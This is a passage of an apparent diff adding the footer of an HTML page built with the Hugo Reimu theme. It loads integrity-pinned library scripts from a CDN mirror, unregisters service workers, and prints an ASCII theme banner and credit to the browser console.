+      </script><script src=https://npm.webcache.cn/qrcode@1.4.4/build/qrcode.min.js defer data-pjax integrity=sha384-0RsG1yo/crf/1Qc14sho26SXXOTngNCjgJw7fuvXBt9W/OChF/Ijx+aUuBDqQwEk crossorigin=anonymous></script><script src=https://npm.webcache.cn/html-to-image@1.11.11/dist/html-to-image.js defer data-pjax integrity=sha384-UbfRVKN3/elS1r7JcK2FhmPP+KlJ4CvYwbyYD7tH+uTkbT9bNJr9eJeQ0FoFbAgz crossorigin=anonymous></script></div></div><script src=https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js async integrity=sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S crossorigin=anonymous></script><script>"serviceWorker"in navigator&&navigator.serviceWorker.getRegistrations().then(e=>{for(let t of e)t.unregister()})</script><script>const reimuCopyright=String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;console.log(String.raw`%c ${reimuCopyright}`,"color: #ff5252;"),console.log("%c Theme.Reimu %c https://github.com/D-Sketon/hugo-theme-reimu ","color: white; background: #ff5252; padding:5px 0;","padding:4px;border:1px solid #ff5252;")</script></body></html>
